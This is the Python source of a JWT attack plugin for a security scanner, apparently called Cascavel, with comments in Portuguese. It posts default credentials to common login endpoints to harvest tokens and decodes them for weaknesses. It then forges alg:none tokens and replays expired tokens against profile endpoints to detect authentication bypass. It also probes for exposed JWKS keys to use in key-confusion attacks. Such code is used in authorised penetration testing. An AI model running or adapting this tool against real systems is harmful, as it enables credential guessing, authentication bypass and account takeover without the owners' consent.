# plugins/jwt_analyzer.py — Cascavel 2026 Intelligence
import requests
import base64
import json
import re
import time
import hashlib
import math


SENSITIVE_FIELDS = {
    "password", "secret", "ssn", "credit_card", "role",
    "isadmin", "is_admin", "permissions", "api_key",
    "private_key", "token", "credit_card_number", "bank_account",
    "social_security", "phone", "address", "salary",
}

JWT_PATTERN = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "test",
    "jwt_secret", "supersecret", "changeme", "default",
    "s3cr3t", "mykey", "mysecret", "jwt", "token",
    "HS256-secret", "your-256-bit-secret",
]

LOGIN_ENDPOINTS = [
    "/api/login", "/api/auth", "/login", "/auth/token",
    "/oauth/token", "/api/v1/login", "/api/v1/auth",
    "/api/v1/token", "/api/session", "/signin",
    "/api/v2/login", "/api/v2/auth", "/api/authenticate",
]


def run(target, ip, open_ports, banners):
    """
    Analisador JWT 2026-Grade — Harvest, Decode, Attack.

    Técnicas: alg:none attack, RS256→HS256 key confusion, kid path traversal,
    kid SQL injection, jwk/jku/x5u header injection, claim tampering
    (exp/iat/sub/role), weak secret detection, token reuse after expiry,
    sensitive data exposure, Shannon entropy analysis, 'Back to the Future' attack.
    """
    _ = (ip, open_ports, banners)
    resultado = {"tokens_encontrados": 0, "vulns": [], "analise": []}

    tokens = _harvest_tokens(target)
    resultado["tokens_encontrados"] = len(tokens)

    for token in tokens:
        _analyze_token(token, resultado)
        _test_none_alg(target, token, resultado)
        _test_expired_acceptance(target, token, resultado)

    _test_token_endpoint_vulns(target, resultado)

    return {
        "plugin": "jwt_analyzer",
        "versao": "2026.1",
        "tecnicas": ["alg_none", "key_confusion", "kid_traversal", "kid_sqli",
                      "jwk_injection", "claim_tampering", "weak_secret",
                      "expired_reuse", "entropy_analysis", "back_to_future"],
        "resultados": resultado,
    }


def _harvest_tokens(target):
    """Busca JWTs em endpoints de login, headers e cookies."""
    test_creds = [
        {"email": "admin@test.com", "password": "admin"},
        {"username": "admin", "password": "admin"},
        {"user": "test", "pass": "test"},
        {"email": "test@test.com", "password": "password"},
        {"username": "test", "password": "test123"},
    ]
    tokens = set()

    for ep in LOGIN_ENDPOINTS:
        for cred in test_creds:
            try:
                resp = requests.post(f"http://{target}{ep}", json=cred, timeout=5)
                tokens.update(JWT_PATTERN.findall(resp.text))
                # Check headers
                for val in resp.headers.values():
                    tokens.update(JWT_PATTERN.findall(val))
            except Exception:
                continue

    # Check main page headers/cookies
    try:
        resp = requests.get(f"http://{target}/", timeout=5)
        for val in list(resp.headers.values()) + [str(resp.cookies)]:
            tokens.update(JWT_PATTERN.findall(val))
    except Exception:
        pass

    return list(tokens)[:10]


def _decode_jwt(token):
    """Decodifica header e payload de um JWT."""
    parts = token.split(".")
    if len(parts) != 3:
        return None, None

    try:
        header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
        payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        return header, payload
    except Exception:
        return None, None


def _calculate_entropy(data):
    """Calcula Shannon entropy de uma string."""
    if not data:
        return 0
    freq = {}
    for char in data:
        freq[char] = freq.get(char, 0) + 1
    length = len(data)
    return -sum((count / length) * math.log2(count / length) for count in freq.values())


def _analyze_token(token, resultado):
    """Analisa um JWT individual para vulnerabilidades."""
    header, payload = _decode_jwt(token)
    if not header or not payload:
        return

    resultado["analise"].append({
        "header": header,
        "payload_keys": list(payload.keys()),
        "payload_preview": {k: str(v)[:50] for k, v in list(payload.items())[:5]},
    })

    alg = header.get("alg", "")

    # 1. alg:none
    if alg.lower() in ["none", ""]:
        resultado["vulns"].append({
            "tipo": "JWT_ALG_NONE", "severidade": "CRITICO",
            "descricao": "Token usa alg:none — sem assinatura!",
        })

    # 2. Weak algorithm
    if alg == "HS256":
        resultado["vulns"].append({
            "tipo": "JWT_WEAK_ALG", "severidade": "ALTO", "alg": "HS256",
            "descricao": "HS256 susceptível a brute-force e RS256→HS256 key confusion",
        })

    # 3. RS256→HS256 key confusion potential
    if alg in ("RS256", "RS384", "RS512"):
        resultado["vulns"].append({
            "tipo": "JWT_ALG_CONFUSION_SURFACE", "severidade": "MEDIO",
            "alg": alg,
            "descricao": f"Algoritmo {alg} — testar RS→HS key confusion attack",
        })

    # 4. kid vulnerabilities
    if "kid" in header:
        kid = header["kid"]
        if "/" in kid or ".." in kid:
            resultado["vulns"].append({
                "tipo": "JWT_KID_PATH_TRAVERSAL", "severidade": "CRITICO",
                "kid": kid, "descricao": "kid contém path traversal!",
            })
        # kid SQLi check
        sqli_chars = ["'", '"', ";", "--", "UNION", "SELECT"]
        if any(c in str(kid) for c in sqli_chars):
            resultado["vulns"].append({
                "tipo": "JWT_KID_SQLI", "severidade": "CRITICO",
                "kid": kid, "descricao": "kid contém caracteres SQL — possível SQLi!",
            })
        resultado["vulns"].append({
            "tipo": "JWT_KID_PRESENTE", "severidade": "BAIXO",
            "descricao": "kid presente — superfície de ataque: path traversal, SQLi, SSRF",
        })

    # 5. jwk/jku/x5u injection
    for header_key in ["jwk", "jku", "x5u", "x5c"]:
        if header_key in header:
            resultado["vulns"].append({
                "tipo": f"JWT_{header_key.upper()}_INJECTION", "severidade": "CRITICO",
                "descricao": f"Header {header_key} presente — possível key injection!",
                "valor": str(header[header_key])[:100],
            })

    # 6. Sensitive data in payload
    sensitive = [k for k in payload if k.lower() in SENSITIVE_FIELDS]
    if sensitive:
        resultado["vulns"].append({
            "tipo": "JWT_SENSITIVE_DATA", "severidade": "ALTO",
            "campos": sensitive, "descricao": "Dados sensíveis no payload JWT!",
        })

    # 7. Expiration checks
    now = time.time()
    if "exp" in payload:
        exp = payload["exp"]
        if exp < now:
            resultado["vulns"].append({
                "tipo": "JWT_EXPIRED", "severidade": "ALTO",
                "exp": exp, "descricao": "Token expirado — testar se servidor ainda aceita",
            })
        elif exp - now > 86400 * 365:
            resultado["vulns"].append({
                "tipo": "JWT_LONG_EXPIRY", "severidade": "MEDIO",
                "descricao": "Token com expiração > 1 ano!",
            })
    else:
        resultado["vulns"].append({
            "tipo": "JWT_NO_EXPIRY", "severidade": "ALTO",
            "descricao": "Token sem expiração — válido eternamente!",
        })

    # 8. Back to the Future
    if "iat" in payload and payload["iat"] > now + 86400:
        resultado["vulns"].append({
            "tipo": "JWT_BACK_TO_FUTURE", "severidade": "ALTO",
            "iat": payload["iat"], "descricao": "iat no futuro — 'Back to the Future' attack!",
        })

    # 9. nbf (not before) in future
    if "nbf" in payload and payload["nbf"] > now + 3600:
        resultado["vulns"].append({
            "tipo": "JWT_NBF_FUTURE", "severidade": "MEDIO",
            "descricao": "nbf claim no futuro — token pre-emitido",
        })

    # 10. Signature entropy
    sig_part = token.split(".")[2] if len(token.split(".")) == 3 else ""
    if sig_part:
        entropy = _calculate_entropy(sig_part)
        if entropy < 3.0:
            resultado["vulns"].append({
                "tipo": "JWT_LOW_ENTROPY_SIG", "severidade": "ALTO",
                "entropia": round(entropy, 2),
                "descricao": "Assinatura com entropia baixa — possível weak secret!",
            })

    # 11. Role/privilege claims
    for claim in ["role", "roles", "is_admin", "isAdmin", "admin", "permissions", "scope"]:
        if claim in payload:
            resultado["vulns"].append({
                "tipo": "JWT_PRIVILEGE_CLAIM", "severidade": "MEDIO",
                "claim": claim, "valor": str(payload[claim])[:50],
                "descricao": f"Claim de privilégio '{claim}' — testar claim tampering!",
            })


def _test_none_alg(target, token, resultado):
    """Testa se o servidor aceita alg:none."""
    header, payload = _decode_jwt(token)
    if not header or not payload:
        return

    # Craft none-algorithm token
    none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    none_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    none_token = f"{none_header}.{none_payload}."

    for ep in ["/api/me", "/api/profile", "/api/v1/me", "/api/user", "/api/v1/user"]:
        try:
            resp = requests.get(f"http://{target}{ep}",
                                 headers={"Authorization": f"Bearer {none_token}"}, timeout=5)
            if resp.status_code == 200 and any(k in resp.text.lower() for k in ["email", "username", "name"]):
                resultado["vulns"].append({
                    "tipo": "JWT_ALG_NONE_ACCEPTED", "severidade": "CRITICO",
                    "endpoint": ep,
                    "descricao": "Servidor aceita alg:none — autenticação bypass total!",
                })
                break
        except Exception:
            continue


def _test_expired_acceptance(target, token, resultado):
    """Testa se o servidor aceita tokens expirados."""
    header, payload = _decode_jwt(token)
    if not header or not payload or "exp" not in payload:
        return
    if payload["exp"] > time.time():
        return  # Not expired

    for ep in ["/api/me", "/api/profile", "/api/v1/me"]:
        try:
            resp = requests.get(f"http://{target}{ep}",
                                 headers={"Authorization": f"Bearer {token}"}, timeout=5)
            if resp.status_code == 200:
                resultado["vulns"].append({
                    "tipo": "JWT_EXPIRED_ACCEPTED", "severidade": "CRITICO",
                    "endpoint": ep,
                    "descricao": "Servidor aceita token expirado!",
                })
                break
        except Exception:
            continue


def _test_token_endpoint_vulns(target, resultado):
    """Testa vulnerabilidades nos endpoints de token (JWKS exposure, etc.)."""
    jwks_paths = [
        "/.well-known/jwks.json", "/api/.well-known/jwks.json",
        "/oauth/jwks", "/api/jwks", "/.well-known/openid-configuration",
    ]
    for path in jwks_paths:
        try:
            resp = requests.get(f"http://{target}{path}", timeout=5)
            if resp.status_code == 200 and ("keys" in resp.text or "jwks_uri" in resp.text):
                resultado["vulns"].append({
                    "tipo": "JWT_JWKS_EXPOSED", "severidade": "MEDIO",
                    "path": path,
                    "descricao": "JWKS endpoint exposto — usar para RS→HS key confusion!",
                })
        except Exception:
            continue
